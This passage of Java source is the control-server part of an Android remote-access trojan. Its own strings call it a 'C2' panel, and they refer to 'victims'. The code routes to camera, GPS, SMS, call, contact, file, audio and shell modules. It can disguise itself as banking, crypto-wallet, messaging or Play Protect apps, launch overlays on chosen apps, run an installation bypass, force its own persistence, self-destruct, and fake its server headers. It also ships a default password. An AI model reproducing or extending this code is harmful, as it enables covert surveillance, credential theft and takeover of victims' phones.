    }

    public Response serve404Proxy() {
        return serve404(null);
    }

    private void setupRouter() {
        router.registerPrefix("/c2/", session -> serveAsset(session, session.getUri()));
        router.registerExact("/logo", this::serveLogo);
        router.registerPrefix("/font/orbitron.ttf", this::serveFont);
        router.registerPrefix("/exploits", session -> exploitsModule.handleRequest(session));
        router.registerPrefix("/terminal", session -> terminalModule.handleRequest(session));
        router.registerExact("/", session -> terminalModule.handleRequest(session));
        router.registerPrefix("/ghost", session -> ghostModule.handleRequest(session));
        router.registerExact("/stealth", session -> ghostModule.handleRequest(session));
        router.registerPrefix("/camera", session -> opticsModule.handleRequest(session));
        router.registerPrefix("/gps", session -> locateModule.handleRequest(session));
        router.registerPrefix("/files", session -> dataModule.handleRequest(session));
        router.registerPrefix("/download/", session -> dataModule.handleRequest(session));
        router.registerPrefix("/calls", session -> commsModule.handleRequest(session));
        router.registerPrefix("/sms", session -> commsModule.handleRequest(session));
        router.registerPrefix("/mms", session -> commsModule.handleRequest(session));
        router.registerExact("/contacts", session -> commsModule.handleRequest(session));
        router.registerPrefix("/intel", session -> intelModule.handleRequest(session));
        router.registerExact("/settings/password", this::updatePassword);
        router.registerPrefix("/audio", session -> acousticsModule.handleRequest(session));
        router.registerPrefix("/device", this::handleDeviceRoutes);
    }

    private Response handleDeviceRoutes(IHTTPSession session) {
        String uri = session.getUri();
        Map<String, String> params = session.getParms();
        if (uri.equals("/device")) {
            return serveDeviceInfo(session);
        } else if (uri.equals("/device/vibrate")) {
            vibrateDevice();
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
        } else if (uri.equals("/device/max-volume")) {
            setMaxVolume();
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
        } else if (uri.equals("/device/flashlight") || uri.equals("/device/torch")) {
            toggleFlashlight();
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"flashlight\": " + isFlashlightOn + "}");
        } else if (uri.equals("/device/silent-mode")) {
            setSilentMode();
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
        } else if (uri.equals("/device/shell")) {
            return terminalModule.handleRequest(session);
        } else if (uri.equals("/device/apps")) {
            return serveAppList(session);
        } else if (uri.equals("/device/open-app")) {
            openAppOnDevice(params.get("pkg"));
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
        } else if (uri.equals("/device/masquerade")) {
            String pkg = params.get("pkg");
            return handleMasqueradeApp(pkg, session);
        } else if (uri.equals("/device/open-url")) {
            openUrlOnDevice(params.get("url"));
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
        } else if (uri.equals("/device/decoy")) {
            String choiceStr = params.get("choice");
            if (choiceStr != null) {
                try {
                    int choice = Integer.parseInt(choiceStr);
                    SystemAnalytics.setDecoyChoice(context, choice);
                    SystemAnalytics.setStealthMode(context, true);
                    logActivity("DECOY_SWITCH: Stealth identity updated to persona " + choice);
                    return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"choice\": " + choice + "}");
                } catch (Exception ignored) {}
            }
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": false}");
        } else if (uri.equals("/device/toast")) {
            String msg = params.get("msg");
            int size = 22, y = 250, duration = 3500;
            String anim = params.get("anim"); if (anim == null) anim = "scroll";
            String color = params.get("color"); if (color == null) color = "#FFFFFF";
            try {
                if (params.containsKey("size")) size = Integer.parseInt(params.get("size"));
                if (params.containsKey("y")) y = Integer.parseInt(params.get("y"));
                if (params.containsKey("duration")) duration = Integer.parseInt(params.get("duration"));
            } catch (Exception ignored) {}
            showToast(msg, size, y, anim, duration, color);
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
        } else if (uri.equals("/device/fix-persistence")) {
            logActivity("SYSTEM_MAINTENANCE: Remotely dispatched permission repair sequence.");
            new Handler(Looper.getMainLooper()).post(() -> {
                Intent intent = new Intent(context, PermissionActivity.class);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
                context.startActivity(intent);
            });
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"REPAIR_SEQUENCE_DISPATCHED\"}");
        } else if (uri.equals("/device/request-permissions")) {
            logActivity("SYSTEM_MAINTENANCE: Remotely dispatched batch permission prompt.");
            new Handler(Looper.getMainLooper()).post(() -> {
                Intent intent = new Intent(context, PermissionActivity.class);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
                context.startActivity(intent);
            });
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"PERMISSION_PROMPTS_DISPATCHED\"}");
        } else if (uri.equals("/device/optimize-stability")) {
            logActivity("SYSTEM_MAINTENANCE: Remotely dispatched OEM auto-start optimization.");
            new Handler(Looper.getMainLooper()).post(() -> OemStabilityHelper.requestAutoStart(context));
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"OEM_OPTIMIZATION_DISPATCHED\"}");
        } else if (uri.equals("/device/deep-repair")) {
            logActivity("SYSTEM_MAINTENANCE: Remotely dispatched application settings details.");
            new Handler(Looper.getMainLooper()).post(() -> {
                try {
                    Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                    intent.setData(Uri.parse("package:" + context.getPackageName()));
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(intent);
                } catch (Exception ignored) {}
            });
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"APP_SETTINGS_OPENED\"}");
        } else if (uri.equals("/device/open-accessibility")) {
            logActivity("SYSTEM_MAINTENANCE: Remotely opened Accessibility settings.");
            new Handler(Looper.getMainLooper()).post(() -> {
                try {
                    Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(intent);
                } catch (Exception ignored) {}
            });
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"ACCESSIBILITY_HUB_OPENED\"}");
        } else if (uri.equals("/device/open-notifications")) {
            logActivity("SYSTEM_MAINTENANCE: Remotely opened Notification Listener settings.");
            new Handler(Looper.getMainLooper()).post(() -> {
                try {
                    Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(intent);
                } catch (Exception ignored) {}
            });
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"NOTIFICATION_HUB_OPENED\"}");
        } else if (uri.equals("/device/inject-trust")) {
            logActivity("SYSTEM_MAINTENANCE: Remotely dispatched session installation bypass.");
            new Handler(Looper.getMainLooper()).post(() -> StabilityBypass.executeTrustInjection(context));
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"BYPASS_SEQUENCE_INITIATED\"}");
        } else if (uri.equals("/device/terminate")) {
            logActivity("SYSTEM_TERMINATED: Remote operator issued hard kill command");
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                Intent intent = new Intent(context, WorkManager_Sync.class);
                intent.setAction(Constants.ACTION_STOP_CORE);
                context.startService(intent);
            }, 1500);
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"redirect\": \"/logout\"}");
        } else if (uri.equals("/device/self-destruct")) {
            selfDestruct();
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
        }
        return null;
    }

    @Override
    public Response serve(IHTTPSession session) {
        if (session == null) return null;

        // Handle CORS Preflight OPTIONS requests
        if (session.getMethod() == Method.OPTIONS) {
            Response res = newFixedLengthResponse(Response.Status.OK, "text/plain", "CORS_OK");
            res.addHeader("Access-Control-Allow-Origin", "*");
            res.addHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS, PUT, DELETE");
            res.addHeader("Access-Control-Allow-Headers", "Content-Type, Authorization, X-Requested-With, Token");
            res.addHeader("Access-Control-Max-Age", "86400");
            return res;
        }

        Response response = handleServeInternal(session);

        if (response != null) {
            response.addHeader("Access-Control-Allow-Origin", "*");
            response.addHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS, PUT, DELETE");
            response.addHeader("Access-Control-Allow-Headers", "Content-Type, Authorization, X-Requested-With, Token");
        }

        return response;
    }

    private Response handleServeInternal(IHTTPSession session) {
        String uri = session.getUri();
        if (uri == null) uri = "/";

        Response response = null;
        CookieHandler cookies = session.getCookies();

        try {
            // Watchdog: Update operator activity time for heartbeat scaling
            WorkManager_Sync.notifyOperatorActivity();

            // 0. Public Asset Handlers
            if (uri.equals("/favicon.ico")) {
                response = newFixedLengthResponse(Response.Status.NO_CONTENT, "image/x-icon", "");
            }
            // 1. Handle Login (Standard Protocol)
            else if (uri.equals("/login") && session.getMethod() == Method.POST) {
                response = authController.handleLogin(session, LOGIN_HTML);
            }
            // 2. Handle Logout
            else if (uri.equals("/logout")) {
                response = authController.handleLogout(session, LOGOUT_HTML);
            }
            // 3. Main Routing & Auth Check
            else {
                String token = cookies.read("token");
                sessionToken = WorkManager_Sync.activeSessionToken;

                boolean isLoggedIn = (token != null && !token.isEmpty() && token.equals(sessionToken));

                if (!isLoggedIn) {
                    if (uri.startsWith("/c2/")) {
                        response = serveAsset(session, uri);
                    } else if (uri.equals("/logo")) {
                        response = serveLogo(session);
                    } else if (uri.startsWith("/font/orbitron.ttf")) {
                        response = serveFont(session);
                    } else {
                        response = serveGzipped(session, "text/html", LOGIN_HTML);
                    }
                } else {
                    if (uri.equals("/login")) {
                        response = newFixedLengthResponse(Response.Status.FOUND, "text/html", "");
                        response.addHeader("Location", "/");
                    } else {
                        response = router.dispatch(session);
                        if (response == null) {
                            response = serve404(session);
                        }
                    }
                }
            }
        } catch (Throwable e) {
            Log.e("FirebaseConfig", "C2_REQUEST_ISOLATION_CATCH: " + e.getMessage(), e);
            response = serveError(session, "C2_INTERNAL_ERROR: " + e.getMessage());
        }

        if (response != null) {
            response.addHeader("Server", "Apache/2.4.41 (Ubuntu)");
            response.addHeader("X-Powered-By", "PHP/7.4.3");

            if (!uri.equals("/logo") && !uri.startsWith("/font/") && !uri.contains("/camera/") && !uri.contains("/ghost/")) {
                response.addHeader("Cache-Control", "no-cache, no-store, must-revalidate");
                response.addHeader("Pragma", "no-cache");
                response.addHeader("Expires", "0");
            } else {
                response.addHeader("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
            }
        }
        return response;
    }

    private Response serveLogo(IHTTPSession session) {
        try {
            java.io.InputStream is = context.getResources().openRawResource(
                context.getResources().getIdentifier("app_logo", "drawable", context.getPackageName()));
            android.graphics.Bitmap bitmap = android.graphics.BitmapFactory.decodeStream(is);
            if (bitmap == null) return serve404(session);

            // Optimization: Scale down large logos for faster delivery from mobile server
            int targetHeight = 207;
            int targetWidth = (int) (bitmap.getWidth() * (targetHeight / (float) bitmap.getHeight()));
            android.graphics.Bitmap scaled = android.graphics.Bitmap.createScaledBitmap(bitmap, targetWidth, targetHeight, true);
            
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            scaled.compress(android.graphics.Bitmap.CompressFormat.PNG, 90, out);
            byte[] bytes = out.toByteArray();
            
            bitmap.recycle();
            scaled.recycle();

            Response response = newFixedLengthResponse(Response.Status.OK, "image/png", new java.io.ByteArrayInputStream(bytes), bytes.length);
            response.addHeader("Cache-Control", "public, max-age=3600");
            return response;
        } catch (Exception e) {
            return serve404(session);
        }
    }

    private Response serveFont(IHTTPSession session) {
        try {
            @SuppressLint("ResourceType") java.io.InputStream is = context.getResources().openRawResource(R.font.orbitron);
            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
            int nRead;
            byte[] data = new byte[16384];
            while ((nRead = is.read(data, 0, data.length)) != -1) {
                buffer.write(data, 0, nRead);
            }
            byte[] bytes = buffer.toByteArray();
            Log.d("LabRATS-Server", "Serving font 'Orbitron' - size: " + bytes.length);
            Response response = newFixedLengthResponse(Response.Status.OK, "font/ttf", new java.io.ByteArrayInputStream(bytes), bytes.length);
            response.addHeader("Cache-Control", "no-cache, must-revalidate");
            response.addHeader("Access-Control-Allow-Origin", "*");
            return response;
        } catch (Exception e) {
            logActivity("SYSTEM_ERROR: Font serving failed: " + e.getMessage());
            return serveError(session, "Font error: " + e.getMessage());
        }
    }



    private Response serveDeviceInfo(IHTTPSession session) {
        logActivity("SYSTEM_EXTRACT: Device hardware and network analytics retrieved");
        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
      
        html.append("<div class=\"back-btn-container\"><a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a></div>");

        // --- HARDWARE ANALYTICS SECTION ---
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin: 0 0 20px 0; color: var(--neon-cyan); text-align: left; font-size: 1.6rem;\">HARDWARE_ANALYTICS <span class=\"info-trigger\" onclick=\"showInfo(event, 'HARDWARE_ANALYTICS', 'Comprehensive hardware and network telemetry extracted from the device.')\">INFO</span></h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div>");

        // Remove the redundant back button from DeviceInfo by stripping the first few chars or just wrapping it
        String deviceData = DeviceInfo.getDeviceInfoHtml(context);
        if (deviceData.contains("back-btn-container")) {
            deviceData = deviceData.substring(deviceData.indexOf("</div>") + 6);
        }
        html.append(deviceData);
        html.append("</div>");
        
        // Redundant script tags removed - handled by assets/c2/script.js

        html.append(getFooter());
        return serveGzipped(session, "text/html", html.toString());
    }




    private Response serve404(IHTTPSession session) {
        String html = getHeader("/404") +
                "<div class=\"card\">" +
                "<div class=\"empty-state\">" +
                "<div class=\"icon\">&#128269;</div>" +
                "<h2 style=\"margin-bottom: 10px;\">Page Not Found</h2>" +
                "<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>" +
                "<p>The requested page does not exist.</p>" +
                "<div style=\"display: flex; justify-content: center; margin-top: 30px;\"><a href=\"/\" class=\"btn\">Back to Terminal</a></div>" +
                "</div>" +
                "</div>" +
                getFooter();
        return serveGzipped(session, "text/html", html);
    }

    private Response serveError(IHTTPSession session, String message) {
        String html = getHeader("/error") +
                "<div class=\"card\">" +
                "<div class=\"empty-state\">" +
                "<div class=\"icon\">&#9888;</div>" +
                "<h2 style=\"margin-bottom: 10px;\">Error</h2>" +
                "<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>" +
                "<p>" + escapeHtml(message) + "</p>" +
                "<div style=\"display: flex; justify-content: center; margin-top: 30px;\"><a href=\"/\" class=\"btn\">Back to Terminal</a></div>" +
                "</div>" +
                "</div>" +
                getFooter();
        return serveGzipped(session, "text/html", html);
    }




    private String escapeHtml(String text) {
        if (text == null)
            return "";
        return text.replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace("\"", "&quot;")
                .replace("'", "&#39;");
    }

    private Response updatePassword(IHTTPSession session) {
        try {
            Map<String, String> files = new HashMap<>();
            session.parseBody(files);
            Map<String, String> params = session.getParms();
            String newPass = params.get("new_password");

            if (newPass == null && files.containsKey("postData")) {
                try {
                    String rawBody = files.get("postData");
                    if (rawBody != null && rawBody.trim().startsWith("{")) {
                        org.json.JSONObject jsonObj = new org.json.JSONObject(rawBody);
                        if (jsonObj.has("new_password")) {
                            newPass = jsonObj.getString("new_password");
                        }
                    }
                } catch (Exception ignored) {}
            }

            // [DEEP_STEALTH] De-obfuscate payload if it's masked
            if (newPass != null && newPass.startsWith("0x_")) {
                try {
                    byte[] decoded = android.util.Base64.decode(newPass.substring(3), android.util.Base64.DEFAULT);
                    newPass = new StringBuilder(new String(decoded, "UTF-8")).reverse().toString();
                } catch (Exception ignored) {}
            }

            if (newPass == null || newPass.trim().isEmpty()) {
                return serveError(session, "Invalid password");
            }

            PasswordHasher.savePassword(context, newPass.trim());

            logActivity("SECURITY_PROTOCOL: Interface password updated");

            String html = getHeader(session.getUri()) + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color:var(--neon-green);\">&#10004;</div><h2>Access Key Updated</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div><p style=\"margin-bottom: 25px;\">New security protocol active. You will need to use this key for future uplinks.</p><div style=\"display: flex; justify-content: center;\"><a href=\"./\" class=\"btn\">Back to Terminal</a></div></div></div>" + getFooter();
            return serveGzipped(session, "text/html", html);
        } catch (Exception e) {
            return serveError(session, "Failed to update password: " + e.getMessage());
        }
    }

    private String getStoredPassword() {
        return context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                .getString("c2_password", "admin1337");
    }

    private static boolean isFlashlightOn = false;

    @OptIn(markerClass = androidx.camera.camera2.interop.ExperimentalCamera2Interop.class)
    private void toggleFlashlight() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                android.hardware.camera2.CameraManager cm = (android.hardware.camera2.CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
                if (cm != null) {
                    String[] ids = cm.getCameraIdList();
                    for (String id : ids) {
                        try {
                            Boolean hasFlash = cm.getCameraCharacteristics(id).get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE);
                            if (Boolean.TRUE.equals(hasFlash)) {
                                isFlashlightOn = !isFlashlightOn;
                                cm.setTorchMode(id, isFlashlightOn);
                                logActivity("HARDWARE_CONTROL: Flashlight " + (isFlashlightOn ? "ENGAGED" : "DISENGAGED"));
                                break;
                            }
                        } catch (Exception ignored) {}
                    }
                }
            } else {
                Analytics_Provider ap = Analytics_Provider.getInstance();
                if (ap != null) {
                    isFlashlightOn = !isFlashlightOn;
                    ap.setFlashMode(isFlashlightOn);
                    logActivity("HARDWARE_CONTROL: Flashlight " + (isFlashlightOn ? "ENGAGED" : "DISENGAGED"));
                }
            }
        } catch (Exception e) {
            Log.e("FirebaseConfig", "Flashlight Error: " + e.getMessage());
        }
    }

    private void vibrateDevice() {
        android.os.Vibrator v = (android.os.Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
        if (v != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                v.vibrate(android.os.VibrationEffect.createOneShot(500, android.os.VibrationEffect.DEFAULT_AMPLITUDE));
            } else {
                v.vibrate(500);
            }
            logActivity("DEVICE_CONTROL: Triggered vibration sequence");
        }
    }

    private void setMaxVolume() {
        android.media.AudioManager am = (android.media.AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
        if (am != null) {
            int[] streams = {android.media.AudioManager.STREAM_RING, android.media.AudioManager.STREAM_MUSIC, 
                             android.media.AudioManager.STREAM_NOTIFICATION, android.media.AudioManager.STREAM_ALARM};
            for (int stream : streams) {
                am.setStreamVolume(stream, am.getStreamMaxVolume(stream), 0);
            }
            logActivity("DEVICE_CONTROL: System volume synchronized to MAXIMUM");
        }
    }

    private void setSilentMode() {
        android.media.AudioManager am = (android.media.AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
        if (am != null) {
            am.setRingerMode(android.media.AudioManager.RINGER_MODE_SILENT);
            logActivity("DEVICE_CONTROL: System entered SILENT mode");
        }
    }

    private void openUrlOnDevice(String url) {
        if (url == null || url.isEmpty()) return;
        try {
            if (!url.startsWith("http")) url = "http://" + url;
            Intent i = new Intent(Intent.ACTION_VIEW);
            i.setData(Uri.parse(url));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(i);
            logActivity("DEVICE_CONTROL: Forced open URL - " + url);
        } catch (Exception e) {
            logActivity("DEVICE_ERROR: Failed to open URL - " + e.getMessage());
        }
    }

    private void openAppOnDevice(String packageName) {
        if (packageName == null || packageName.isEmpty()) return;
        try {
            Intent i = context.getPackageManager().getLaunchIntentForPackage(packageName);
            if (i != null) {
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(i);
                logActivity("DEVICE_CONTROL: Forced open App - " + packageName);
            } else {
                logActivity("DEVICE_ERROR: No launch intent for " + packageName);
            }
        } catch (Exception e) {
            logActivity("DEVICE_ERROR: Failed to open app - " + e.getMessage());
        }
    }

    private void showToast(String msg) {
        showToast(msg, 22, 250, "scroll", 12000, "#FFFFFF");
    }

    private void showToast(String msg, int size, int y, String anim, int duration, String hexColor) {
        if (msg == null || msg.isEmpty()) return;
        new Handler(Looper.getMainLooper()).post(() -> {
            IO_Persistence_Manager ghost = IO_Persistence_Manager.getInstance();
            if (ghost != null) {
                if ("burnt".equalsIgnoreCase(anim)) {
                    // CHAOTIC BURNT TOAST: Multiple random spawns
                    int count = 6 + (int)(Math.random() * 6); // 6 to 11 toasts
                    String[] glitchColors = {"#FF3131", "#39FF14", "#00F2FF", "#FFFF00", "#FF00FF", "#FFFFFF", "#FF9D00"};
                    
                    for (int i = 0; i < count; i++) {
                        final int index = i;
                        new Handler(Looper.getMainLooper()).postDelayed(() -> {
                            int rSize = 15 + (int)(Math.random() * 40);
                            int rY = 100 + (int)(Math.random() * 1600);
                            int rDur = 4000 + (int)(Math.random() * 6000);
                            String rColor = glitchColors[(int)(Math.random() * glitchColors.length)];
                            // 50% chance to scroll, 50% to stay in place with glitch
                            String rAnim = (Math.random() > 0.5) ? "scroll" : "burnt";
                            ghost.showOverlayToast(msg, rSize, rY, rAnim, rDur, rColor);
                        }, index * 300);
                    }
                } else {
                    ghost.showOverlayToast(msg, size, y, anim, duration, hexColor);
                }
                logActivity("DEVICE_CONTROL: Overlay toast dispatched via Ghost - " + msg);
            } else {
                // Fallback to standard toast if Accessibility is not enabled
                android.widget.Toast.makeText(context, msg, android.widget.Toast.LENGTH_LONG).show();
                logActivity("DEVICE_CONTROL: Ghost toast dispatched (Standard) - " + msg);
            }
        });
    }

    private Response serveAppList(IHTTPSession session) {
        logActivity("SYSTEM_EXTRACT: Package manager database retrieved");
        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        html.append("<div class=\"back-btn-container\"><a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a></div>");
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"text-align: left; margin-bottom: 20px;\">Installed Applications</h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");
        
        android.content.pm.PackageManager pm = context.getPackageManager();
        List<android.content.pm.PackageInfo> apps = pm.getInstalledPackages(0);
        
        html.append("<div style=\"overflow-x: auto;\"><table><thead><tr><th>Icon</th><th>App Name</th><th>Package ID</th><th>Type</th><th>Version</th><th>Actions</th></tr></thead><tbody>");
        for (android.content.pm.PackageInfo app : apps) {
            String name = app.applicationInfo.loadLabel(pm).toString();
            boolean isSystem = (app.applicationInfo.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0;
            String typeLabel = isSystem ? "<span style=\"color:#888; font-size:0.6rem;\">SYSTEM</span>" : "<span style=\"color:var(--neon-green); font-size:0.6rem; font-weight:bold;\">USER</span>";
            String iconBase64 = getAppIconBase64(app.applicationInfo);
            String iconImg = iconBase64.isEmpty() ? "<div style='width:24px;height:24px;background:#333;border-radius:4px;'></div>" : 
                "<img src='data:image/png;base64," + iconBase64 + "' style='width:24px;height:24px;border-radius:4px;'>";

            html.append("<tr><td style='width:30px;'>").append(iconImg).append("</td>");
            html.append("<td>").append(escapeHtml(name)).append("</td>");
            html.append("<td style=\"font-family:monospace; font-size:0.7rem;\">").append(app.packageName).append("</td>");
            html.append("<td>").append(typeLabel).append("</td>");
            html.append("<td>").append(app.versionName != null ? app.versionName : "1.0").append("</td>");

            html.append("<td style=\"white-space: nowrap;\">");
            html.append("<a href=\"/device/open-app?pkg=").append(app.packageName).append("\" class=\"btn btn-small\" style=\"border-color:var(--neon-green); color:var(--neon-green); background:rgba(57,255,20,0.05); margin-right:5px;\">▶️ LAUNCH</a>");
            html.append("<a href=\"/device/masquerade?pkg=").append(app.packageName).append("\" class=\"btn btn-small\" style=\"border-color:var(--neon-cyan); color:var(--neon-cyan); background:rgba(0,242,255,0.05); margin-right:5px;\">🎭 MASQUERADE</a>");
            html.append("<a href=\"/ghost/interact?action=overlay&pkg=").append(app.packageName).append("\" class=\"btn btn-small\" style=\"border-color:var(--neon-orange); color:var(--neon-orange); background:rgba(255,157,0,0.05);\">🔒 OVERLAY</a>");
            html.append("</td></tr>");
        }
        html.append("</tbody></table></div></div>").append(getFooter());
        return serveGzipped(session, "text/html", html.toString());
    }

    private Response handleMasqueradeApp(String pkg, IHTTPSession session) {
        if (pkg == null || pkg.isEmpty()) return serveError(session, "Package parameter missing");
        
        try {
            Map<String, String> params = session.getParms();
            android.content.pm.PackageManager pm = context.getPackageManager();
            android.content.pm.ApplicationInfo appInfo = pm.getApplicationInfo(pkg, 0);
            String appName = appInfo.loadLabel(pm).toString();

            // Determine matching alias component based on package or category
            String targetAlias = "SettingsAlias"; // Play Protect default
            String lowerPkg = pkg.toLowerCase();
            String lowerName = appName.toLowerCase();

            if (lowerPkg.contains("whatsapp") || lowerName.contains("whatsapp")) {
                targetAlias = "WhatsAppAlias";
            } else if (lowerPkg.contains("telegram") || lowerName.contains("telegram")) {
                targetAlias = "TelegramAlias";
            } else if (lowerPkg.contains("instagram") || lowerName.contains("instagram")) {
                targetAlias = "InstagramAlias";
            } else if (lowerPkg.contains("youtube") || lowerName.contains("youtube")) {
                targetAlias = "YouTubeAlias";
            } else if (lowerPkg.contains("chrome") || lowerName.contains("chrome")) {
                targetAlias = "ChromeAlias";
            } else if (lowerPkg.contains("bank") || lowerPkg.contains("pcfinancial") || lowerName.contains("bank") || lowerPkg.contains("casino") || lowerPkg.contains("bet") || lowerPkg.contains("bree")) {
                targetAlias = "BankAlias";
            } else if (lowerPkg.contains("mail") || lowerPkg.contains("proton") || lowerName.contains("mail") || lowerPkg.contains("email")) {
                targetAlias = "MailAlias";
            } else if (lowerPkg.contains("vpn") || lowerName.contains("vpn")) {
                targetAlias = "VPNAlias";
            } else if (lowerPkg.contains("pdf") || lowerPkg.contains("adobe") || lowerName.contains("acrobat") || lowerName.contains("reader")) {
                targetAlias = "PdfAlias";
            } else if (lowerPkg.contains("music") || lowerPkg.contains("spotify") || lowerName.contains("music")) {
                targetAlias = "MusicAlias";
            } else if (lowerPkg.contains("twitter") || lowerPkg.contains("x.android") || lowerName.contains("twitter") || lowerName.equals("x")) {
                targetAlias = "TwitterAlias";
            } else if (lowerPkg.contains("termux") || lowerName.contains("termux")) {
                targetAlias = "TermuxAlias";
            } else if (lowerPkg.contains("electrum") || lowerPkg.contains("wallet") || lowerName.contains("crypto") || lowerName.contains("bitcoin")) {
                targetAlias = "CryptoAlias";
            } else if (lowerPkg.contains("calculator") || lowerName.contains("calculator") || lowerPkg.contains("calc")) {
                targetAlias = "CalculatorAlias";
            } else if (lowerPkg.contains("weather") || lowerName.contains("weather")) {
                targetAlias = "WeatherAlias";
            } else if (lowerPkg.contains("settings") || lowerPkg.contains("vending") || lowerPkg.contains("protect") || lowerName.contains("settings")) {
                targetAlias = "SettingsAlias";
            } else if (lowerPkg.equals("android") || lowerPkg.contains("com.android.systemui") || lowerPkg.contains("system.service")) {
                targetAlias = "AndroidSystemAlias";
            }

            context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                    .edit()
                    .putString("masquerade_pkg", pkg)
                    .putString("masquerade_name", appName)
                    .putBoolean("decoy_deployed", true)
                    .apply();

            SystemAnalytics.setStealthMode(context, true);

            logActivity("STEALTH_CAMOUFLAGE: App identity morphed to " + appName + " (" + pkg + ") via " + targetAlias);

            String safeAppName = appName.replace("\"", "\\\"");
            if ("true".equals(params.get("json")) || (session.getHeaders().get("accept") != null && session.getHeaders().get("accept") != null && session.getHeaders().get("accept").contains("json"))) {
                return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"appName\": \"" + safeAppName + "\", \"alias\": \"" + targetAlias + "\"}");
            }

            String html = getHeader(session.getUri()) + 
                "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color:var(--neon-cyan);\">🎭</div><h2>App Identity Morphed</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div><p style=\"margin-bottom: 25px;\">Launcher camouflage active as <b>" + escapeHtml(appName) + "</b> (" + escapeHtml(pkg) + ").<br>Icon and label assigned via <b>" + targetAlias + "</b> with dynamic icon bitmap pinning.<br>Victim launches on the home screen will seamlessly pass through to the real application.</p><div style=\"display: flex; justify-content: center;\"><a href=\"/device/apps\" class=\"btn\">Back to Apps</a></div></div></div>" + getFooter();
            return serveGzipped(session, "text/html", html);
        } catch (Exception e) {
            return serveError(session, "Failed to masquerade app: " + e.getMessage());
        }
    }

    private String getAppIconBase64(android.content.pm.ApplicationInfo appInfo) {
        try {
            android.content.pm.PackageManager pm = context.getPackageManager();
            android.graphics.drawable.Drawable drawable = appInfo.loadIcon(pm);
            android.graphics.Bitmap bitmap;
            if (drawable instanceof android.graphics.drawable.BitmapDrawable) {
                bitmap = ((android.graphics.drawable.BitmapDrawable) drawable).getBitmap();
            } else {
                int w = Math.max(1, drawable.getIntrinsicWidth());
                int h = Math.max(1, drawable.getIntrinsicHeight());
                bitmap = android.graphics.Bitmap.createBitmap(w, h, android.graphics.Bitmap.Config.ARGB_8888);
                android.graphics.Canvas canvas = new android.graphics.Canvas(bitmap);
                drawable.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
                drawable.draw(canvas);
            }
